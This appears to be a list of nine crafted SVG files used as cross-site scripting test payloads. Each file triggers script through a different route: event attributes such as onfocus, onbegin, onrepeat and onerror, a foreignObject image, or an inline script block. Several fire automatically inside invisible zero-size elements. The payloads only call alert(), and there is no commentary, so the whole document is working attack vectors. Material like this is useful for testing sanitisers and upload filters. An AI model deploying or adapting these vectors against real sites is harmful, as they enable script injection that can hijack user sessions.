<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" tabindex="0" width="1" height="1">
  <a xlink:href="#" onfocus="alert('XSS10')">
    <rect width="1" height="1" fill="transparent" />
  </a>
</svg>
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:ev="http://www.w3.org/2001/xml-events"
     width="1" height="1">
  <circle cx="0" cy="0" r="0"
          ev:onclick="alert('XSS9')" />
</svg>

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <metadata onclick="alert('XSS8')">
    <!-- hidden payload trigger area -->
  </metadata>
</svg>

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="0" height="0">
  <rect x="0" y="0" width="1" height="1">
    <animateMotion path="M0,0 L1,1"
                   dur="0.01s" repeatCount="1"
                   onrepeat="alert('XSS7')" />
  </rect>
</svg>

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100"
        fill="none" stroke="black"
        onmousemove="alert('XSS6')" />
</svg>

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <img src="x" onerror="alert('XSS5')" />
    </body>
  </foreignObject>
</svg>

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    alert('XSS4');
  ]]></script>
</svg>

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <circle r="0">
    <animate attributeName="r"
             from="0" to="1" dur="0.001s" begin="0"
             onbegin="alert('XSS3')" />
  </circle>
</svg>

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <image href="no-such.png"
         width="1" height="1"
         onerror="alert('XSS2')" />
</svg>

